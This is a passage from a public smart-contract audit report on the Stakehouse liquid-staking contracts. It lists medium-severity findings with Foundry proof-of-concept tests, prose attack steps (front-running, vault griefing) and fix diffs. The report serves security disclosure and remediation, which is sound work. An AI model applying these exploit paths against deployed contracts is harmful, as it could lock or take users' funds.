manager.rotateNodeRunnerOfSmartWallet(accountOne, accountTwo, true);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nA function, which should be only callable by the DAO, that can directly set `bannedNodeRunners` for a node runner can be added.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/381)**\n\n\n\n***\n\n## [[M-25] Incorrect checking in `_assertUserHasEnoughGiantLPToClaimVaultLP`](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/382)\n*Submitted by [hihen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/382), also found by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/413) and [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/145)*\n\nThe batch operations of `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol are meaningless because they will fail whenever more than one lpToken is passed.<br>\nEach user can perform `withdrawDETH()` or `withdrawLPTokens()` with one LPToken only once a day.\n\n### Proof of Concept\n\nBoth the `withdrawDETH()` in GiantSavETHVaultPool.sol and `withdrawLPTokens()` in GiantPoolBase.sol will call `GiantPoolBase._assertUserHasEnoughGiantLPToClaimVaultLP(lpToken, amount)` and `lpTokenETH.burn(msg.sender, amount)`:\n\nThere is a require in `_assertUserHasEnoughGiantLPToClaimVaultLP()`:\n\n    require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n\nAt the same time, `lpTokenETH.burn(msg.sender, amount)` will update `lastInteractedTimestamp[msg.sender]` to latest block timestamp in `_afterTokenTransfer()` of GiantLP.sol.\n\nSo, a user can perform `withdrawDETH` or `withdrawLPTokens` of one LPToken only once a day, others more will fail by `_assertUserHasEnoughGiantLPToClaimVaultLP()`.\n\n### Tools Used\n\nVS Code\n\n### Recommended Mitigation Steps\n\nThe LPToken being operated on should be checked for lastInteractedTimestamp rather than lpTokenETH.\n\n    diff --git a/contracts/liquid-staking/GiantPoolBase.sol b/contracts/liquid-staking/GiantPoolBase.sol\n    index 8a8ff70..5c009d9 100644\n    --- a/contracts/liquid-staking/GiantPoolBase.sol\n    +++ b/contracts/liquid-staking/GiantPoolBase.sol\n    @@ -93,7 +93,7 @@ contract GiantPoolBase is ReentrancyGuard {\n         function _assertUserHasEnoughGiantLPToClaimVaultLP(LPToken _token, uint256 _amount) internal view {\n             require(_amount >= MIN_STAKING_AMOUNT, \"Invalid amount\");\n             require(_token.balanceOf(address(this)) >= _amount, \"Pool does not own specified LP\");\n    -        require(lpTokenETH.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n    +        require(_token.lastInteractedTimestamp(msg.sender) + 1 days < block.timestamp, \"Too new\");\n         }\n\n         /// @dev Allow an inheriting contract to have a hook for performing operations post depositing ETH\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/382)**\n\n\n\n***\n\n## [[M-26] Compromised or malicious DAO can restrict actions of node runners who are not malicious](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/383)\n*Submitted by [rbserver](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/383), also found by [chaduke](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/441)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LSDNFactory.sol#L73-L102><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L239-L246><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L308-L321><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L326-L350>\n\n### Impact\n\nWhen calling the `deployNewLiquidStakingDerivativeNetwork` function, `_dao` is not required to be an address that corresponds to a governance contract. This is also confirmed by the code walkthrough at <https://www.youtube.com/watch?v=7UHDUA9l6Ek&t=650s>, which mentions that `_dao` can correspond to an address of a single user. Especially when the DAO is set to be an EOA address, it is possible that its private key becomes compromised. Moreover, because the `updateDAOAddress` function lacks a two step procedure for transferring the DAO's role, it is possible that the DAO is set to an uncontrolled address, which can be malicious. When the DAO becomes compromised or malicious, the actions of the node runners, who are not malicious, can be restricted at the DAO's will, such as by calling functions like `rotateEOARepresentativeOfNodeRunner` and `rotateNodeRunnerOfSmartWallet`. For example, a compromised DAO can call the `rotateNodeRunnerOfSmartWallet` function to transfer a smart wallet from a node runner, who is not malicious at all, to a colluded party. Afterwards, the affected node runner is banned from many interactions with the protocol and can no longer call, for instance, the `withdrawETHForKnot` function for withdrawing ETH from the corresponding smart wallet. Hence, a compromised or malicious DAO can cause severe consequences, including ETH losses.\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LSDNFactory.sol#L73-L102>\n\n```solidity\n    function deployNewLiquidStakingDerivativeNetwork(\n        address _dao,\n        uint256 _optionalCommission,\n        bool _deployOptionalHouseGatekeeper,\n        string calldata _stakehouseTicker\n    ) public returns (address) {\n\n        // Clone a new liquid staking manager instance\n        address newInstance = Clones.clone(liquidStakingManagerImplementation);\n        ILiquidStakingManager(newInstance).init(\n            _dao,\n            ...\n        );\n\n        ...\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L239-L246>\n\n```solidity\n    function updateDAOAddress(address _newAddress) external onlyDAO {\n        require(_newAddress != address(0), \"Zero address\");\n        require(_newAddress != dao, \"Same address\");\n\n        emit UpdateDAOAddress(dao, _newAddress);\n\n        dao = _newAddress;\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L308-L321>\n\n```solidity\n    function rotateEOARepresentativeOfNodeRunner(address _nodeRunner, address _newRepresentative) external onlyDAO {\n        require(_newRepresentative != address(0), \"Zero address\");\n\n        address smartWallet = smartWalletOfNodeRunner[_nodeRunner];\n        require(smartWallet != address(0), \"No smart wallet\");\n        require(stakedKnotsOfSmartWallet[smartWallet] == 0, \"Not all KNOTs are minted\");\n        require(smartWalletRepresentative[smartWallet] != _newRepresentative, \"Invalid rotation to same EOA\");\n\n        // unauthorize old representative\n        _authorizeRepresentative(smartWallet, smartWalletRepresentative[smartWallet], false);\n\n        // authorize new representative\n        _authorizeRepresentative(smartWallet, _newRepresentative, true);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356-L377>\n\n```solidity\n    function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {\n        require(_new != address(0) && _current != _new, \"New is zero or current\");\n\n        address wallet = smartWalletOfNodeRunner[_current];\n        require(wallet != address(0), \"Wallet does not exist\");\n        require(_current == msg.sender || dao == msg.sender, \"Not current owner or DAO\");\n\n        address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];\n        require(newRunnerCurrentWallet == address(0), \"New runner has a wallet\");\n\n        smartWalletOfNodeRunner[_new] = wallet;\n        nodeRunnerOfSmartWallet[wallet] = _new;\n\n        delete smartWalletOfNodeRunner[_current];\n\n        if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n            bannedNodeRunners[_current] = true;\n            emit NodeRunnerBanned(_current);\n        }\n\n        emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new);\n    }\n```\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L326-L350>\n\n```solidity\n    function withdrawETHForKnot(address _recipient, bytes calldata _blsPublicKeyOfKnot) external {\n        ...\n\n        address associatedSmartWallet = smartWalletOfKnot[_blsPublicKeyOfKnot];\n        require(smartWalletOfNodeRunner[msg.sender] == associatedSmartWallet, \"Not the node runner for the smart wallet \");\n        require(isNodeRunnerBanned(nodeRunnerOfSmartWallet[associatedSmartWallet]) == false, \"Node runner is banned from LSD network\");\n        ...\n    }\n```\n\n### Proof of Concept\n\nPlease add the following test in `test\\foundry\\LSDNFactory.t.sol`. This test will pass to demonstrate the described scenario.\n\n```solidity\n    function testCompromisedDaoCanRestrictActionsOfNodeRunnersWhoAreNotMalicious() public {\n        vm.prank(address(factory));\n        manager.updateDAOAddress(admin);\n\n        uint256 nodeStakeAmount = 4 ether;\n        address nodeRunner = accountOne;\n        vm.deal(nodeRunner, nodeStakeAmount);\n\n        address eoaRepresentative = accountTwo;\n\n        vm.prank(nodeRunner);\n        manager.registerBLSPublicKeys{value: nodeStakeAmount}(\n            getBytesArrayFromBytes(blsPubKeyOne),\n            getBytesArrayFromBytes(blsPubKeyOne),\n            eoaRepresentative\n        );\n\n        // Simulate a situation where admin, who is the dao at this moment, is compromised.\n        // Although nodeRunner is not malicious,\n        //   the compromised admin can call the rotateNodeRunnerOfSmartWallet function to assign nodeRunner's smart wallet to a colluded party.\n        vm.prank(admin);\n        manager.rotateNodeRunnerOfSmartWallet(nodeRunner, accountThree, true);\n\n        // nodeRunner is blocked from other interactions with the protocol since it is now banned unfairly\n        assertEq(manager.bannedNodeRunners(accountOne), true);\n\n        // for example, nodeRunner is no longer able to call the withdrawETHForKnot function\n        vm.prank(nodeRunner);\n        vm.expectRevert(\"Not the node runner for the smart wallet \");\n        manager.withdrawETHForKnot(nodeRunner, blsPubKeyOne);\n    }\n```\n\n### Tools Used\n\nVSCode\n\n### Recommended Mitigation Steps\n\nWhen calling the `deployNewLiquidStakingDerivativeNetwork` function, instead of explicitly setting the DAO's address, a configurable governance contract, which can have features like voting and timelock, can be deployed and used as the DAO.\n\n**[vince0656 (Stakehouse) disputed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/383)**\n\n\n\n***\n\n## [[M-27] `rotateNodeRunnerOfSmartWallet` is vulnerable to a frontrun attack](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/386)\n*Submitted by [Franfran](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/386)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L356><br>\n<https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LiquidStakingManager.sol#L369>\n\nAs the `rotateNodeRunnerOfSmartWallet` function can be called by anyone who is a node runner in the LSD network, this function is vulnerable to a frontrun attack in the case of this node runner being malicious.\n\n#### Proof of Concept\n\nIf that is the current node runner is malicious, the DAO would purposely call this same `rotateNodeRunnerOfSmartWallet` with the `_wasPreviousNodeRunnerMalicious` flag turned on.<br>\nAn actual node runner that has been malicious could monitor the mempool and frontrun the DAO transaction that wanted to slash it and submit the transaction before the DAO to avoid getting banned and rotate their EOA representation of the node.\n\n```solidity\nif (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n    bannedNodeRunners[_current] = true;\n    emit NodeRunnerBanned(_current);\n}\n```\n\nWhen the DAO transaction would go through, it would revert when it's checking if the current (old) node representative is still a wallet, but it's not because the mapping value has been deleted before.\n\n```solidity\naddress wallet = smartWalletOfNodeRunner[_current];\nrequire(wallet != address(0), \"Wallet does not exist\");\n```\n\n### Recommended Mitigation Steps\n\nRestrict this function to DAO only with the `onlyDAO` modifier.\n\n```solidity\n// - function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) external {\n+ function rotateNodeRunnerOfSmartWallet(address _current, address _new, bool _wasPreviousNodeRunnerMalicious) onlyDAO external {\n    require(_new != address(0) && _current != _new, \"New is zero or current\");\n\n    address wallet = smartWalletOfNodeRunner[_current];\n    require(wallet != address(0), \"Wallet does not exist\");\n    require(_current == msg.sender || dao == msg.sender, \"Not current owner or DAO\");\n\n    address newRunnerCurrentWallet = smartWalletOfNodeRunner[_new];\n    require(newRunnerCurrentWallet == address(0), \"New runner has a wallet\");\n\n    smartWalletOfNodeRunner[_new] = wallet;\n    nodeRunnerOfSmartWallet[wallet] = _new;\n\n    delete smartWalletOfNodeRunner[_current];\n\n    // - if (msg.sender == dao && _wasPreviousNodeRunnerMalicious) {\n    if (_wasPreviousNodeRunnerMalicious) {\n        bannedNodeRunners[_current] = true;\n        emit NodeRunnerBanned(_current);\n    }\n\n    emit NodeRunnerOfSmartWalletRotated(wallet, _current, _new);\n}\n```\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/386)**\n\n\n\n***\n\n## [[M-28] Funds are not claimed from syndicate for valid BLS keys of first key is invalid (no longer part of syndicate).](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408)\n*Submitted by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L218>\n\nclaimRewards in StakingFundsVault.sol has this code:\n\n    if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n        // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n        // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n        _claimFundsFromSyndicateForDistribution(\n            liquidStakingNetworkManager.syndicate(),\n            _blsPubKeys\n        );\n        // Distribute ETH per LP\n        updateAccumulatedETHPerLP();\n    }\n\nThe issue is that if the first BLS public key is not part of the syndicate, then \\_claimFundsFromSyndicateForDistribution will not be called, even on BLS keys that are eligible for syndicate rewards. This leads to reduced rewards for user.\n\nThis is different from a second bug which discusses the possibility of using a stale acculmulatedETHPerLP.\n\n### Impact\n\nUsers will not receive rewards for claims of valid public keys if first passed key is not part of syndicate.\n\n### Recommended Mitigation Steps\n\nDrop the `i==0` requirement, which was intended to make sure the claim isn't called multiple times. Use a hasClaimed boolean instead.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408#event-8238936350)**\n\n\n\n***\n\n## [[M-29] User receives less rewards than they are eligible for if first passed BLS key is inactive](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410)\n*Submitted by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/StakingFundsVault.sol#L224>\n\nStakingFundsVault has the claimRewards() function to allow users to withdraw profits.\n\n    function claimRewards(\n        address _recipient,\n        bytes[] calldata _blsPubKeys\n    ) external nonReentrant {\n        for (uint256 i; i < _blsPubKeys.length; ++i) {\n            require(\n                liquidStakingNetworkManager.isBLSPublicKeyBanned(_blsPubKeys[i]) == false,\n                \"Unknown BLS public key\"\n            );\n            // Ensure that the BLS key has its derivatives minted\n            require(\n                getAccountManager().blsPublicKeyToLifecycleStatus(_blsPubKeys[i]) == IDataStructures.LifecycleStatus.TOKENS_MINTED,\n                \"Derivatives not minted\"\n            );\n            if (i == 0 && !Syndicate(payable(liquidStakingNetworkManager.syndicate())).isNoLongerPartOfSyndicate(_blsPubKeys[i])) {\n                // Withdraw any ETH accrued on free floating SLOT from syndicate to this contract\n                // If a partial list of BLS keys that have free floating staked are supplied, then partial funds accrued will be fetched\n                _claimFundsFromSyndicateForDistribution(\n                    liquidStakingNetworkManager.syndicate(),\n                    _blsPubKeys\n                );\n                // Distribute ETH per LP\n                updateAccumulatedETHPerLP();\n            }\n            // If msg.sender has a balance for the LP token associated with the BLS key, then send them any accrued ETH\n            LPToken token = lpTokenForKnot[_blsPubKeys[i]];\n            require(address(token) != address(0), \"Invalid BLS key\");\n            require(token.lastInteractedTimestamp(msg.sender) + 30 minutes < block.timestamp, \"Last transfer too recent\");\n            _distributeETHRewardsToUserForToken(msg.sender, address(token), token.balanceOf(msg.sender), _recipient);\n        }\n    }\n\nThe issue is that `updateAccumulatedETHPerLP()` is not guaranteed to be called, which means the ETH reward distribution in \\_distribute would use stale value, and users will not receive as many rewards as they should.<br>\n`updateAccumulatedETHPerLP` is only called if the first BLS public key is part of the syndicate. However, for the other keys it makes no reason not to use the up to date accumulatedETHPerLPShare value.\n\n### Impact\n\nUser receives less rewards than they are eligible for if first passed BLS key is inactive.\n\n### Recommended Mitigation Steps\n\nCall updateAccumulatedETHPerLP() at the start of the function.\n\n**[vince0656 (Stakehouse) confirmed and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410#issuecomment-1329370912):**\n > This is a dupe of issue [408 (M-28)](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/408)\n\n**[LSDan (judge) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410#issuecomment-1335919764):**\n > I've asked the warden to come in and highlight the differences between this and M-28.\n\n**[Trust (warden) commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/410#issuecomment-1335928402):**\n > Hi. Both rewards show different ways in which users don't receive their eligible rewards.<br>\n> \n> This report talks about use of an old accumulatedETHPerLPShare in the call to _distributeETHRewardsToUserForToken(). It will happen in any case where we don't go into the if block. Using an old value means users won't receive as much rewards as have been unlocked.<br>\n> The second report (M-28) is about _claimFundsFromSyndicateForDistribution not being called although it should be. suppose the blsPubKeys array has first element which is no longer part of syndicate, but the rest of the array are part of syndicate. Then we skip claiming funds from them. Therefore, there will be less funds to give away as rewards.\n> \n> One report is about incorrect *share value* leak, the second is about *total rewards* leak.\n\n\n\n***\n\n## [[M-30] Giant pools are prone to user griefing, preventing their holdings from being staked](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/415)\n*Submitted by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/415)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/GiantMevAndFeesPool.sol#L105>\n\nbatchRotateLPTokens in GiantMevAndFeesPool allows any user to rotate LP tokens of stakingFundsVaults around.\n\n    function batchRotateLPTokens(\n        address[] calldata _stakingFundsVaults,\n        LPToken[][] calldata _oldLPTokens,\n        LPToken[][] calldata _newLPTokens,\n        uint256[][] calldata _amounts\n    ) external {\n        uint256 numOfRotations = _stakingFundsVaults.length;\n        require(numOfRotations > 0, \"Empty arrays\");\n        require(numOfRotations == _oldLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _newLPTokens.length, \"Inconsistent arrays\");\n        require(numOfRotations == _amounts.length, \"Inconsistent arrays\");\n        require(lpTokenETH.balanceOf(msg.sender) >= 0.5 ether, \"No common interest\");\n        for (uint256 i; i < numOfRotations; ++i) {\n            StakingFundsVault(payable(_stakingFundsVaults[i])).batchRotateLPTokens(_oldLPTokens[i], _newLPTokens[i], _amounts[i]);\n        }\n    }\n\nThere is a check that sender has over 0.5 ether of lpTokenETH, to prevent griefing. However, this check is unsatisfactory as user can at any stage deposit ETH to receive lpTokenETH and burn it to receive back ETH. Their lpTokenETH holdings do not correlate with their interest in the vault funds.\n\nTherefore, malicious users can keep bouncing LP tokens around and prevent them from being available for actual staking by liquid staking manager.\n\n### Impact\n\nGiant pools are prone to user griefing, preventing their holdings from being staked.\n\n### Recommended Mitigation Steps\n\nThree options:\n\n1.  batchRotateLPTokens should have logic to enforce that this specific rotation is logical\n2.  Only DAO or some priviledged user can perform Giant pool operations\n3.  Make the caller have something to lose from behaving maliciously, unlike the current status.\n\n**[vince0656 (Stakehouse) disputed and commented](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/415#issuecomment-1336214451):**\n > This doesn't factor in that when ETH is supplied to a liquid staking network, it has 30 minutes to be utilized for staking with the BLS public key - giant pool users can manage this inventory and move the liquidity between BLS keys but that's by design and as mentioned above cannot move for 30 minutes at a time. If it never gets used, it can always go back to the giant pool\n\n\n\n***\n\n## [[M-31] Vaults can be griefed to not be able to be used for deposits](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/422)\n*Submitted by [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/422), also found by [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/368) and [Lambda](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/140)*\n\n<https://github.com/code-423n4/2022-11-stakehouse/blob/4b6828e9c807f2f7c569e6d721ca1289f7cf7112/contracts/liquid-staking/ETHPoolLPFactory.sol#L111>\n\nInteraction with SavETHVault and StakingFundsVault require a minimum amount of `MIN_STAKING_AMOUNT`. In order to be used for staking, there needs to be 24 ETH or 4 ETH for the desired BLS public key in those vaults. The issue is that vaults can be griefed and made impossible to use for depositing by constantly making sure the *remaining* amount to be added to complete the deposit to the maxStakingAmountPerValidator, is under `MIN_STAKING_AMOUNT`.\n\nIn \\_depositETHForStaking:\n\n```\nfunction _depositETHForStaking(bytes calldata _blsPublicKeyOfKnot, uint256 _amount, bool _enableTransferHook) internal {\n    require(_amount >= MIN_STAKING_AMOUNT, \"Min amount not reached\");\n    require(_blsPublicKeyOfKnot.length == 48, \"Invalid BLS public key\");\n    // LP token issued for the KNOT\n    // will be zero for a new KNOT because the mapping doesn't exist\n    LPToken lpToken = lpTokenForKnot[_blsPublicKeyOfKnot];\n    if(address(lpToken) != address(0)) {\n        // KNOT and it's LP token is already registered\n        // mint the respective LP tokens for the user\n        // total supply after minting the LP token must not exceed maximum staking amount per validator\n        require(lpToken.totalSupply() + _amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n        // mint LP tokens for the depoistor with 1:1 ratio of LP tokens and ETH supplied\n        lpToken.mint(msg.sender, _amount);\n        emit LPTokenMinted(_blsPublicKeyOfKnot, address(lpToken), msg.sender, _amount);\n    }\n    else {\n\t\n        // check that amount doesn't exceed max staking amount per validator\n        require(_amount <= maxStakingAmountPerValidator, \"Amount exceeds the staking limit for the validator\");\n    ...    \n\n```\n\nMED - Can grief vaults (SavETHVault, StakingFundsVault) and make them not able to be used for staking by depositing so that left to stake is < `MIN_STAKING_AMOUNT`. Then it will fail maxStakingAmount check @ \\_depositEthForStaking\n\n### Impact\n\nVaults can be griefed to not be able to be used for deposits.\n\n### Proof of Concept\n\n1.  savETHVault has 22 ETH for some validator\n2.  Attacker deposits 1.9991 ETH to the savETHVault\n3.  vault now has 23.9991 ETH. The remaining to complete to 24 is 0.0009 ETH which is under 0.001 ether, min staking amount\n4.  No one can complete the staking\n\nNote that depositers may try to remove their ETH and redeposit it to complete the deposit to 24. However attack may still keep the delta just under `MIN_STAKING_AMOUNT`.\n\n### Recommended Mitigation Steps\n\nHandle the case where the remaining amount to be completed is smaller than `MIN_STAKING_AMOUNT`, and allow the deposit in that case.\n\n**[vince0656 (Stakehouse) confirmed](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/422)**\n\n\n\n***\n\n# Low Risk and Non-Critical Issues\n\nFor this contest, 60 reports were submitted by wardens detailing low risk and non-critical issues. The [report highlighted below](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/403) by **0xSmartContract** received the top score from the judge.\n\n*The following wardens also submitted reports: [rbserver](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/434), [0xNazgul](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/431), [Trust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/426), [Deivitto](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/405), [joestakey](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/400), [a12jmx](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/390), [lukris02](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/388), [c3phas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/385), [datapunk](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/373), [Aymen0909](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/359), [tnevler](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/355), [fs0c](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/353), [pashov](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/350), [Franfran](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/347), [0x4non](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/345), [delfin454000](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/340), [CloudX](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/339), [IllIllI](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/332), [immeas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/327), [Diana](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/324), [Josiah](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/322), [brgltd](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/321), [zaskoh](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/316), [bulej93](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/315), [cryptostellar5](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/310), [Udsen](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/309), [gz627](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/305), [pedr02b2](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/289), [nogo](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/285), [zgo](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/281), [B2](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/272), [0xdeadbeef0x](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/265), [sakman](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/250), [0xmuxyz](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/243), [sahar](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/236), [ch0bu](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/231), [aphak5010](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/223), [rotcivegaf](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/209), [SmartSek](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/205), [shark](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/203), [Awesome](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/193), [9svR6w](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/185), [trustindistrust](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/168), [Rolezn](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/161), [chrisdior4](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/159), [gogo](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/158), [0xRoxas](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/151), [Bnke0x0](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/95), [martin](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/85), [RaymondFam](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/80), [Sathish9098](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/69), [Secureverse](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/66), [oyc\\_109](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/44), [ReyAdmirado](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/38), [clems4ever](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/34), [peanuts](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/26), [chaduke](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/16), [hl\\_](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/13), and [pavankv](https://github.com/code-423n4/2022-11-stakehouse-findings/issues/10).*\n\n## Summary\n\n### Low Risk Issues List\n| Number |Issues Details|Context|\n|:--:|:-------|:--:|\n|[L-01]| Draft Openzeppelin Dependencies| 1 |\n|[L-02]| Stack too deep when compiling |  |\n|[L-03]| Remove unused code | 2 |\n|[L-04]|Insufficient coverage |  |\n|[L-05]|Critical Address Changes Should Use Two-step Procedure |  |\n|[L-06]| Owner can renounce Ownership | 2 |\n|[L-07]| Loss of precision due to rounding| 1 |\n|[L-08]| Using vulnerable dependency of OpenZeppelin | 1 |\n|[L-09]|Use ```safeTransferOwnership``` instead of ```transferOwnership``` function | 2 |\n\nTotal 9 issues\n\n### Non-Critical Issues List\n| Number |Issues Details|Context|\n|:--:|:-------|:--:|\n| [N-01]|`0 address` check |7|\n| [N-02] |Add parameter to Event-Emit  |1|\n| [N-03] | Omissions in Events | 1 |\n| [N-04] | Include ``return parameters`` in _NatSpec comments_| All contracts |\n| [N-05] | Use a more recent version of Solidity | All contracts|\n| [N-06] |Solidity compiler optimizations can be problematic  |  |\n| [N-07] |NatSpec is missing | 27 |\n| [N-08] |Lines are too long | 9|\n| [N-09] |Missing Event for critical parameters change| 1 |\n| [N-10] | Add to indexed parameter for countable Events | 4 |\n| [N-11] |NatSpec comments should be increased in contracts | All contracts |\n| [N-12] |Open TODOs | 1 |\n| [N-13] |`Empty blocks` should be _removed_ or _Emit_ something | 10 |\n| [N-14] |Avoid variable names that can shade  | 1 |\n| [N-15] |Use a more recent version of Solidity | All contracts |\n| [N-16] | _Lock pragmas_ to specific compiler version | 24 |\n\nTotal 16 issues\n\n### Suggestions\n| Number | Suggestion Details |\n|:--:|:-------|\n| [S-01] |Generate perfect code headers every time |\n\nTotal 1 suggestion\n\n## [L-01] Draft Openzeppelin Dependencies\n\nThe `LPToken.sol` contract utilised draft-ERC20PermitUpgradeable.sol , an OpenZeppelin contract. This contract is still a draft and is not considered ready for mainnet use. OpenZeppelin contracts may be considered draft contracts if they have not received adequate security auditing or are liable to change with future development.\n\n[LPToken.sol#L6](https://github.com/code-423n4/2022-11-stakehouse/blob/main/contracts/liquid-staking/LPToken.sol#L6)\n\n```solidity\ncontracts/liquid-staking/LPToken.sol:\n\n  6: 